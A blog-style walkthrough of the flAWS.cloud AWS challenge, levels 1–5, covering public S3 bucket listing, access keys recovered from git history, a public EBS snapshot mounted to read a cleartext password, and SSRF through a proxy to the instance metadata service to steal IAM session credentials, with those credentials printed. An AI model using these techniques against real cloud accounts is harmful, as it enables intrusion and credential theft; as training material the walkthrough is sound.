---
title: "Flawscloud"
date: 2022-05-25T09:31:38+05:30
draft: false
description: flAWS.cloud is a set of CTF-like challenges that teach you common security issues in AWS accounts. The game is about breaking into a real AWS account by exploiting badly crafted account permissions. It has 6 levels.
draft: false
hideToc: false
tocPosition: outer
enableToc: true
enableTocContent: false
author: Atom
authorEmoji: ✍️
tags:
- aws-cli
- git
- s3
series:
- cloud pentest - aws
categories:
- Cloud Pentest
libraries:
- 
image: 
---

Hi Hackers Welcome Back ..


Today we are going to look into <a href=”[http://flaws.cloud/](http://flaws.cloud/)”>flaws.cloud</a> it     is a set of CTF-like challenges that teach you common security issues in AWS accounts. The game is about breaking into a real AWS account by exploiting badly crafted account permissions. It has 6 levels, we are going to look one by one

let’s start with level  1. 

## Level 1


This level is *buckets* of fun. See if you can find the first sub-domain.
Need a hint? Visit Hint 1


[flaws.cloud](http://flaws.cloud) is hosted on AWS which we found on Scope of this ctf . when you hear a name ```bucket``` in aws it refers to s3 storage  bucket,

let us try to find subdomain we need to know about target domain ip and DNS records we are going to use tool called nslookup 

so what is nslookup ?

 

nslookup is the name of a program that lets an Internet server administrator or any computer user enter a host  name (for example, "whatis.com") and find out the corresponding  IP address   or domain name system ( DNS ) record. The user can also enter a command for it to do a reverse DNS lookup and find the host name for an IP address that is specified

``` jsx
ubuntu@ubuntu-2204:~$ nslookup flaws.cloud
Server:		127.0.0.53
Address:	127.0.0.53#53

Non-authoritative answer:
Name:	flaws.cloud
Address: 52.218.177.66

ubuntu@ubuntu-2204:~$ nslookup 52.218.177.66
66.177.218.52.in-addr.arpa	name = s3-website-us-west-2.amazonaws.com.
```

we can now sure that the target domain is hosted on AWS s3 bucket  and  target ip belongs to [s3-website-us-west-2.amazonaws.com](http://s3-website-us-west-2.amazonaws.com) domain 

the web page [flaws.cloud](http://flaws.cloud)  is hosted as a static website on S3 bucket in region “us-west-2”, which is region US West (Oregon). This is a great way to host a static site, similar to hosting one via github pages (our blog site is also hosted on github pages). Some interesting facts about S3 hosting: When hosting a site as an S3 bucket, the bucket name (flaws.cloud) must match the domain name (flaws.cloud). Also, S3 buckets are a global name space, meaning two people cannot have buckets with the same name. The result of this is you could create a bucket named microsoft.com and microsoft would never be able host their main site via S3 hosting.

Visiting ```52.218.177.66```  the ip address on web, your browser will direct you to [https://aws.amazon.com/s3/](https://aws.amazon.com/s3/)  So you know ```flaws.cloud``` is hosted as an S3 bucket.

we can then run:

```jsx
nslookup 52.218.177.66
# Returns:
# Non-authoritative answer:
# 255.184.231.54.in-addr.arpa     name = s3-website-us-west-2.amazonaws.com

```

So we know it's hosted in the AWS region us-west-2

Side note (not useful for this game): All S3 buckets, when configured for web hosting, are given an AWS domain you can use to browse to it without setting up your own DNS. In this case, flaws.cloud can also be visited by going to [http://flaws.cloud.s3-website-us-west-2.amazonaws.com/](http://flaws.cloud.s3-website-us-west-2.amazonaws.com/)

an AWS S3 static site, . A common misconfiguration for web servers is [directory listing](https://www.owasp.org/index.php/OWASP_Periodic_Table_of_Vulnerabilities_-_Directory_Indexing)  if it is misconfigured then unauthenticated users are granted permissions to list a bucket. This may reveal sensitive content, like the link to the next level.

Region and bucket name are enough to list the bucket. We use the AWS command line client for it. To make an unauthenticated request, use the flag “–no-sign-request”.

install aws cli 

```jsx
# For Debian and Ubuntu Devices
apt install python-pip	#python 2
apt install python3-pip	#python 3

# For CentOS and RHEL
# yum install epel-release 
# yum install python-pip

# finally install the AWS CLI
pip install awscli --upgrade --user

# You can check the version by running
aws --version
```

```jsx
ubuntu@ubuntu-2204:~$ aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2
2017-03-13 23:00:38       2575 hint1.html
2017-03-02 23:05:17       1707 hint2.html
2017-03-02 23:05:11       1101 hint3.html
2020-05-22 14:16:45       3162 index.html
2018-07-10 12:47:16      15979 logo.png
2017-02-26 20:59:28         46 robots.txt
2017-02-26 20:59:30       1051 secret-dd02c7c.html
```

we can able to list some files from the list we can see that secret.html page  lets try to see the content on that page 

**Navigate to** [http://flaws.cloud/secret-dd02c7c.html](http://flaws.cloud/secret-dd02c7c.html)

```jsx
					_____  _       ____  __    __  _____
					|     || |     /    ||  |__|  |/ ___/
					|   __|| |    |  o  ||  |  |  (   \_ 
					|  |_  | |___ |     ||  |  |  |\__  |
					|   _] |     ||  _  ||  `  '  |/  \ |
					|  |   |     ||  |  | \      / \    |
					|__|   |_____||__|__|  \_/\_/   \___|
		Congrats! You found the secret file!
Level 2 is at http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
```

we got link to level 2

## Level 2

The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the free tier For hints, see [Hint 1](http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/hint1.html)

for this level we need AWS account and IAM user,  if you don’t have <a href=[https://docs.aws.amazon.com/rekognition/latest/dg/setting-up.html#setting-up-signup](https://docs.aws.amazon.com/rekognition/latest/dg/setting-up.html#setting-up-signup)> create it </a> 

after sign-up 

```text
1. Open the IAM console.
2. In the navigation pane of the console, choose Users.
3. Choose your IAM user name (not the check box).
4. Choose the Security credentials tab and then choose Create access key.
5. To see the new access key, choose Show. Your credentials will look something like this:
	Access key ID: AKIA4**********
	Secret access key: iKllUgQDSJtYk*************************
6. To download the key pair, choose Download .csv file. Store the keys in a secure   location.
7. Keep the keys confidential in order to protect your AWS account, and never email them. Do not share them outside your organization, even if an inquiry appears to come from AWS or Amazon.com. No one who legitimately represents Amazon will ever ask you for your secret key.
```

need to configure aws iam user credentials to aws cli 

```jsx
ubuntu@ubuntu-2204:~$ aws configure

AWS Access Key ID [None]: AKIA4**********

AWS Secret Access Key [None]: iKllUgQDSJtYk*************************

Default region name [None]: us-west-2

Default output format [None]: JSON
```

like previous level let’s we list if any directory's available . 

```jsx
ubuntu@ubuntu-2204:~$ aws s3 --profile default ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 21:02:15      80751 everyone.png
2017-03-02 22:47:17       1433 hint1.html
2017-02-26 21:04:39       1035 hint2.html
2017-02-26 21:02:14       2786 index.html
2017-02-26 21:02:14         26 robots.txt
2017-02-26 21:02:15       1051 secret-e4443fc.html
```

we got some files with that, the file name  secret-file.html makes interest,  let us dig into ```secret-e4443fc.html`` file
```jsx
ubuntu@ubuntu-2204:~/Desktop$ curl http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html
<html>
    <head>
        <title>flAWS</title>
        <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
        <style>
            body { font-family: Andale Mono, monospace; }
            :not(center) > pre { background-color: #202020; padding: 4px; border-radius: 5px; border-color:#00d000; 
            border-width: 1px; border-style: solid;} 
        </style>
    </head>
<body 
  text="#00d000" 
  bgcolor="#000000"  
  style="max-width:800px; margin-left:auto ;margin-right:auto"
  vlink="#00ff00" link="#00ff00">
    
<center>
<pre >
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_ 
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|
</pre>

<h1>Congrats! You found the secret file!</h1>
</center>

Level 3 is at <a href="http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud">http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</a>
```
we got Level 3 access 

## Level 3

The next level is fairly similar, with a slight twist.  Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are. For hints, see [Hint 1](http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint1.html)

like previous level let’s verify any directory listing is available or not 

```jsx
ubuntu@ubuntu-2204:~/Desktop$ aws s3 --profile default ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/
                           PRE .git/
2017-02-26 19:14:33     123637 authenticated_users.png
2017-02-26 19:14:34       1552 hint1.html
2017-02-26 19:14:34       1426 hint2.html
2017-02-26 19:14:35       1247 hint3.html
2017-02-26 19:14:33       1035 hint4.html
2020-05-22 14:21:10       1861 index.html
2017-02-26 19:14:33         26 robots.txt
```

we got some list of hints but look carefully we got .git directory which makes some interest to look into it. for that let us download the directory 

```jsx
ubuntu@ubuntu-2204:~/Desktop$ aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud . --no-sign-request --region us-west-2
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint4.html to ./hint4.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/robots.txt to ./robots.txt
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint3.html to ./hint3.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/index.html to ./index.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint2.html to ./hint2.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint1.html to ./hint1.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/authenticated_users.png to ./authenticated_users.png
```

after installing git on our system. navigate to downloaded directory and type git log

```jsx
[atom@atom-virtualbox l3]$ git log
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit
```

we can see that there ware two comments,  while look into the second comment ```Oops, accidentally added something I shouldn't have```  he developer or targeted user added something which  is definitely don't want other peoples to see. the good and bad thing about git is a version control we can revert back to the previous version of the document. let us see the difference between this first and second comment versions. 

```jsx
ubuntu@ubuntu-2204:~/Desktop/Flaws.cloud/ls - 3$ git diff f52ec03b227ea6094b04e43f475fb0126edb5a61 b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
diff --git a/access_keys.txt b/access_keys.txt
deleted file mode 100644
index e3ae6dd..0000000
--- a/access_keys.txt
+++ /dev/null
@@ -1,2 +0,0 @@
-access_key AKIAJ366LIPB4IJKT7SA
-secret_access_key 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
ubuntu@ubuntu-2204:~/Desktop/Flaws.cloud/ls - 3$
```

we can see that developer. had accidentally put ```Access_key``` and ```Secret_key``` of user 

using this credentials let us create new profile ```f3```

```jsx
ubuntu@ubuntu-2204:~/Desktop/Flaws.cloud/ls - 3$ aws configure --profile f3
AWS Access Key ID : AKIAJ366LIPB4IJKT7SA
AWS Secret Access Key ]: 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
Default region name [default]: us-west-2
Default output format [JSON]: text
```

using Newly created profile ```f3``` list buckets 

```jsx
ubuntu@ubuntu-2204:~/Desktop/Flaws.cloud/ls - 3$ aws s3api list-buckets --profile f3
BUCKETS	2020-06-25T17:43:56.000Z	2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
BUCKETS	2020-06-26T23:06:07.000Z	config-bucket-975426262029
BUCKETS	2020-06-27T10:46:15.000Z	flaws-logs
BUCKETS	2020-06-27T10:46:15.000Z	flaws.cloud
BUCKETS	2020-06-27T15:27:14.000Z	level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
BUCKETS	2020-06-27T15:27:14.000Z	level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
BUCKETS	2020-06-27T15:27:14.000Z	level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
BUCKETS	2020-06-27T15:27:15.000Z	level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
BUCKETS	2020-06-27T15:27:15.000Z	level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
BUCKETS	2020-06-28T02:29:47.000Z	theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
OWNER	0xdabbad00	d70419f1cb589d826b5c2b8492082d193bca52b1e6a81082c36c993f367a5d73
```

all the challenges hosted on from this buckets. we got level 4 path

## Level 4

For the next level, you need to get access to the web page running on an EC2 at  [4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/)

It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it. Need a hint? Go to [Hint 1](http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint1.html) 

if we visit the given link prompt asked to enter username and password. after performing brute forced and directory listing nothing worked, we know that the site is hosted in ubuntu on nginx server which is ec2 instance. question says the snapshot made after nginx was setup on it, if we found snapshot we can download and look into nginx config ware the passwords and configurations are stored.   

{{< img src="/images/cloudpentest/fc0.png" alt="image alt" width="1000px" position="center" >}}

we can snapshot the disk volume of an EC2 as a backup. In this case, the snapshot was made public, but we will need to find it.

To do this, first we need the account ID, which we can get using the AWS key from the previous level:

```jsx
ubuntu@ubuntu-2204:~/Desktop$ aws --profile f3 sts get-caller-identity
975426262029	arn:aws:iam::975426262029:user/backup	AIDAJQ3H5DC3LEG2BKSLC
```

ware ```f3``` is the profile 3 which is configured on previous level 

Using that command also tells you the name of the account, which in this case is named "backup". The backups this account makes are snapshots of EC2s. Next, discover the snapshot:

```jsx
ubuntu@ubuntu-2204:~/Desktop$ aws --profile f3 ec2 describe-snapshots --owner-id 975426262029
SNAPSHOTS		False	975426262029	100%	snap-0b49342abd1bdcb89	2017-02-28T01:35:12.000Z	completed	standard	vol-04f1c039bc13ea950	8
TAGS	Name	flaws backup 2017.02.27

```

We specify the owner-id just to filter the output. For fun, run that command without the owner-id and notice all the snapshots that are publicy readable. By default snapshots are private, and we can transfer them between accounts securely by specifiying the account ID of the other account, but a number of people just make them public and forget about them it seems.

This snapshot is in us-west-2 You're going to want to look in that snapshot.

Now that we know the snapshot ID, we need to mount it. we need to do this in our own AWS account, which you can get for free.

{{< img src="/images/cloudpentest/fc1.png" alt="image alt" width="1000px" position="center" >}}


it take some time to start instance. point your mouse on top of instance name right click and select connect 

{{< img src="/images/cloudpentest/fc2.png" alt="image alt" width="1000px" position="center" >}}


you can able to see the connection steps 

```jsx
ubuntu@ubuntu-2204:~/Desktop$ sudo ssh -i "kp-l3.pem" ec2-user@ec2-34-216-207-4.us-west-2.compute.amazonaws.com
The authenticity of host 'ec2-34-216-207-4.us-west-2.compute.amazonaws.com (34.216.207.4)' can't be established.
ED25519 key fingerprint is SHA256:rffHg5EdntpsnKxGDZc7A4ZHhIKL/lOiV5ColbyKs7s.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'ec2-34-216-207-4.us-west-2.compute.amazonaws.com' (ED25519) to the list of known hosts.

       __|  __|_  )
       _|  (     /   Amazon Linux 2 AMI
      ___|\___|___|

https://aws.amazon.com/amazon-linux-2/
2 package(s) needed for security, out of 5 available
Run "sudo yum update" to apply all updates.
[ec2-user@ip-172-31-33-178 ~]$
```

```jsx
[ec2-user@ip-172-31-33-178 ~]$ lsblk
NAME    MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
xvda    202:0    0   8G  0 disk 
└─xvda1 202:1    0   8G  0 part /
xvdb    202:16   0   8G  0 disk 
└─xvdb1 202:17   0   8G  0 part 
[ec2-user@ip-172-31-33-178 ~]$ sudo file -s /dev/xvdb
/dev/xvdb: x86 boot sector; partition 1: ID=0x83, active, starthead 0, startsector 16065, 16761118 sectors, code offset 0x63
[ec2-user@ip-172-31-33-178 ~]$ sudo mkdir /mnt/snapshot
[ec2-user@ip-172-31-33-178 ~]$ sudo mount /dev/xvdb1 /mnt/snapshot/
[ec2-user@ip-172-31-33-178 ~]$
```

```jsx
[ec2-user@ip-172-31-33-178 ~]$ cd /mnt/snapshot/
[ec2-user@ip-172-31-33-178 snapshot]$ ls
bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
[ec2-user@ip-172-31-33-178 snapshot]$ cd var/www/html/
[ec2-user@ip-172-31-33-178 html]$ ls
index.html  robots.txt
[ec2-user@ip-172-31-33-178 html]$ cat index.html 
<html>
    <head>
        <title>flAWS</title>
        <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
        <style>
            body { font-family: Andale Mono, monospace; }
        </style>
    </head>
<body 
  text="#00d000" 
  bgcolor="#000000"  
  style="max-width:800px; margin-left:auto ;margin-right:auto"
  vlink="#00ff00" link="#00ff00">
<center>
<pre>
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_ 
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|
</pre>
<h1>flAWS - Level 5</h1>
</center>

Good work getting in.  This level is described at <a href="http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/">http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/</a>

[ec2-user@ip-172-31-33-178 html]$
```

we got level 5 access 

if we need password of the login, we already know the server of the site is nginx. the default password of the nginx is located on ```/etc/nginx/.htpasswd```

```jsx
[ec2-user@ip-172-31-33-178 ~]$ cat /mnt/snapshot/etc/nginx/.htpasswd 
flaws:$apr1$4ed/7TEL$cJnixIRA6P4H8JDvKVMku0
[ec2-user@ip-172-31-33-178 ~]$
```

 note the password is hashed 

Instead of going crazy on cracking it (which would fail) you can just look around a bit. What you will find is a setup script that generated the password file. It contains the password in clear text.

```jsx
[ec2-user@ip-172-31-33-178 /]$ cat /mnt/snapshot/home/ubuntu/setupNginx.sh
htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
```

let’s log in using ```username : flaws password: nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M```

{{< img src="/images/cloudpentest/fc3.png" alt="image alt" width="1000px" position="center" >}}

lets we move to Level 5

## Level 5

This EC2 has a simple HTTP only proxy on it. Here are some examples of it's usage:

- [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/)
- [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml)
- [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/)

See if you can use this proxy to figure out how to list the contents of the level6 bucket at [level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud](http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/) that has a hidden directory in it.

Need a hint? Go to [Hint 1](http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/hint1.html)

we have level 6  url, while try to access we can see that ```Access Denied```  because level 6 is hosted on sub directory for that we need to play level 5 properly   

{{< img src="/images/cloudpentest/fc4.png" alt="image alt" width="1000px" position="center" >}}

before that we already know what is <a href=[https://www.geeksforgeeks.org/what-is-apipa-automatic-private-ip-addressing/](https://www.geeksforgeeks.org/what-is-apipa-automatic-private-ip-addressing/)>APIPA </a> ip , while computer starts our computer waits less then 6 seconds for DHCP response. if DHCP  server isn’t reachable.  then the computer automatically assign ip with in the range of APIPA  **(169.254.0.1 to 169.254.255.254)** 

aws uses one of the ip address from APIPA range  169.254.169.254 for <a href=[https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)> **Retrieve instance metadata** </a>

if we click the first link which they given 

```jsx
[http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/)
```

according to aws <a href=[https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)> documentation </a>only access instance metadata and user data from within the instance itself, the data is not protected by authentication or cryptographic methods. Anyone who has direct access to the instance, and potentially any software running on the instance, can view its metadata. Therefore, you should not store sensitive data, such as passwords or long-lived encryption keys, as user data.

using metadata service ip lets try to fetch some information about target instance 

```jsx
buntu@ubuntu-2204:~/Desktop$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/
1.0
2007-01-19
2007-03-01
2007-08-29
2007-10-10
2007-12-15
2008-02-01
2008-09-01
2009-04-04
2011-01-01
2011-05-01
2012-01-12
2014-02-25
2014-11-05
2015-10-20
2016-04-19
2016-06-30
2016-09-02
2018-03-28
2018-08-17
2018-09-24
2019-10-01
2020-10-27
2021-01-03
2021-03-23
2021-07-15
```

after searching some suspicious directory  we have found aws key

```jsx
latestubuntu@ubuntu-2204:~/Desktop$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/
dynamic
meta-data
user-dataubuntu@ubuntu-2204:~/Desktop$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/ubuntu@ubuntu-2204:~/Desktop$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam
info
security-credentials/ubuntu@ubuntu-2204:~/Desktop$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials\
> ^C
ubuntu@ubuntu-2204:~/Desktop$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials
flawsubuntu@ubuntu-2204:~/Desktop$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
{
  "Code" : "Success",
  "LastUpdated" : "2022-05-24T12:58:01Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA6GG7PSQGQ7TEPAVL",
  "SecretAccessKey" : "AV94C6SrOv16H1vbsrHmCu/pEVWBCuWtGT+Pgmjf",
  "Token" : "IQoJb3JpZ2luX2VjEI3//////////wEaCXVzLXdlc3QtMiJIMEYCIQCEqt7ihjFqIL+clfFUGVUlUXq48ls5oFSAcwDO/NA2HQIhAJCVag13eXa2OdxHgsPlD7amM78frrg/sEIDPnYU3ChgKtIECHYQAhoMOTc1NDI2MjYyMDI5IgwcJjgItcBGb+d12xAqrwT+ir31XEYJuCr7JuNOrdFRRoSGo2ptgTHwa9v+c7Fq9FqzRxkvLiIflOFi3lqRJDnqVcU5K4vPedazvmaxNuB6SAg1B/Ky2pxo6krK3HpASIDjsqLUBrWOd5xqV4aLMVtQWtEX7+E7jsnSb/7hF3fctAh6isKKmkiyoIFi4WlZSiB5Pw4AOtisQEb+HHJ3/8gldY00jXLww1uK+i98/SJ6tkVSfv7K0VtL/0Ca1T1SUax8rBewKUWG5lAi/ayezhR4gQp8KJ7/Z+u+1Stet+HbNDgt9rEE7Cn4lQ+olRZFg31hiGckdiXBh3w6T0vdReh0ZYRqrlsO+3qZUeYzLM28aRFW54A6olsixnzzFABbeZ+v7CM90CNSAYIxE3hnf8QJsr41kK8a2thYgZKJs1wMIVE4DWb4ApiJ6rBL6uh7wDGuMAlrfBCoXcKpPnYfIDFmnM3p2f9Tut8S6l8DuYYzPYSd5d85rtDl9EJ+7kzcdqtZmVB5K39ZQTmYnIPRn5AVldwx9X0MNt0Pm0FDa5qQHBIH7m29SaQPr9oif6r6KyiRX+hHMCzO8Pw3clRIeeKJ8q30GKB0oSYUMOrsVuEqyGlczGsVPccXct0CzVkMGNW7LPeqioPZuKSl9CyKELVRgkSJKArR/f0zSfCAv6libMFDb34ddZP7LExGRjBwxVek02ROB22aHcOYUmp8WbBCzgdA4efaCB4/IMPzNPrazkewU/2aJ7Q/S9QN6wnNMKKss5QGOqgBaBx1ekIlITawdZ3PLRy7Ab+bLcFQq+EoUsA1yK+p7kPq9pdYSWxspq/F39hw+h+B0wUlfuSwO6STNGfUOHXnM0Ud0F/5fqCJoK9RrqpeXqtp/wkWygP4sR5pHy5zjJMO+0BLZmoNi0ISE+2o5ATOIaK8WHBCPlxJfGfsmE3OXjhPF3tK+v9zQJIvjGBDOcFNkYtSpD97xVXoe/f+SoqW2eSre8LijWLN",
  "Expiration" : "2022-05-24T18:58:22Z"
}ubuntu@ubuntu-2204:~/Desktop$
```

lets we configure profile using this credentials 

<aside>
💡 configure aws_session_token in **credentials** file which is located under ~/.aws/

</aside>

```jsx
[level6]
aws_access_key_id = ASIA6GG7PSQGQ7TEPAV
aws_secret_access_key = AV94C6SrOv16H1vbsrHmCu/pEVWBCuWtGT+Pgmjf
aws_session_token = IQoJb3JpZ2luX2VjEI3//////////wEaCXVzLXdlc3QtMiJIMEYCIQCEqt7ihjFqIL+clfFUGVUlUXq48ls5oFSAcwDO/NA2HQIhAJCVag13eXa2OdxHgsPlD7amM78frrg/sEIDPnYU3ChgKtIECHYQAhoMOTc1NDI2MjYyMDI5IgwcJjgItcBGb+d12xAqrwT+ir31XEYJuCr7JuNOrdFRRoSGo2ptgTHwa9v+c7Fq9FqzRxkvLiIflOFi3lqRJDnqVcU5K4vPedazvmaxNuB6SAg1B/Ky2pxo6krK3HpASIDjsqLUBrWOd5xqV4aLMVtQWtEX7+E7jsnSb/7hF3fctAh6isKKmkiyoIFi4WlZSiB5Pw4AOtisQEb+HHJ3/8gldY00jXLww1uK+i98/SJ6tkVSfv7K0VtL/0Ca1T1SUax8rBewKUWG5lAi/ayezhR4gQp8KJ7/Z+u+1Stet+HbNDgt9rEE7Cn4lQ+olRZFg31hiGckdiXBh3w6T0vdReh0ZYRqrlsO+3qZUeYzLM28aRFW54A6olsixnzzFABbeZ+v7CM90CNSAYIxE3hnf8QJsr41kK8a2thYgZKJs1wMIVE4DWb4ApiJ6rBL6uh7wDGuMAlrfBCoXcKpPnYfIDFmnM3p2f9Tut8S6l8DuYYzPYSd5d85rtDl9EJ+7kzcdqtZmVB5K39ZQTmYnIPRn5AVldwx9X0MNt0Pm0FDa5qQHBIH7m29SaQPr9oif6r6KyiRX+hHMCzO8Pw3clRIeeKJ8q30GKB0oSYUMOrsVuEqyGlczGsVPccXct0CzVkMGNW7LPeqioPZuKSl9CyKELVRgkSJKArR/f0zSfCAv6libMFDb34ddZP7LExGRjBwxVek02ROB22aHcOYUmp8WbBCzgdA4efaCB4/IMPzNPrazkewU/2aJ7Q/S9QN6wnNMKKss5QGOqgBaBx1ekIlITawdZ3PLRy7Ab+bLcFQq+EoUsA1yK+p7kPq9pdYSWxspq/F39hw+h+B0wUlfuSwO6STNGfUOHXnM0Ud0F/5fqCJoK9RrqpeXqtp/wkWygP4sR5pHy5zjJMO+0BLZmoNi0ISE+2o5ATOIaK8WHBCPlxJfGfsmE3OXjhPF3tK+v9zQJIvjGBDOcFNkYtSpD97xVXoe/f+SoqW2eSre8LijWLN

~
```

let us list directory using above credentials  

```jsx
ubuntu@ubuntu-2204:~/.aws$ aws s3 --profile level6 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/
                           PRE ddcc78ff/
2017-02-26 21:11:07        871 index.html
ubuntu@ubuntu-2204:~/.aws$
```

we have found sub directory. which helps to find level6 URL 

```jsx
ubuntu@ubuntu-2204:~/.aws$ curl http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/
<html>
    <head>
        <title>flAWS - Level 6</title>
        <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
        <style>
            body { font-family: Andale Mono, monospace; }
        </style>
    </head>
<body 
  text="#00d000" 
  bgcolor="#000000"  
  style="max-width:800px; margin-left:auto ;margin-right:auto"
  vlink="#00ff00" link="#00ff00">
<center>
<pre>
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_ 
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|
</pre>
<h1>flAWS - Level 6</h1>
</center>

<h3>Lesson learned</h3>

The IP address 169.254.169.254 is a magic IP in the cloud world.  AWS, Azure, Google, DigitalOcean and others use this to allow cloud resources to find out metadata about themselves.  Some, such as Google, have additional constraints on the requests, such as requiring it to use `Metadata-Flavor: Google` as an HTTP header and refusing requests with an `X-Forwarded-For` header.  AWS has recently created a new IMDSv2 that requires special headers, a challenge and response, and other protections, but many AWS accounts may not have enforced it.  If you can make any sort of HTTP request from an EC2 to that IP, you'll likely get back information the owner would prefer you not see.

<h4>Examples of this problem</h4>
<ul> 
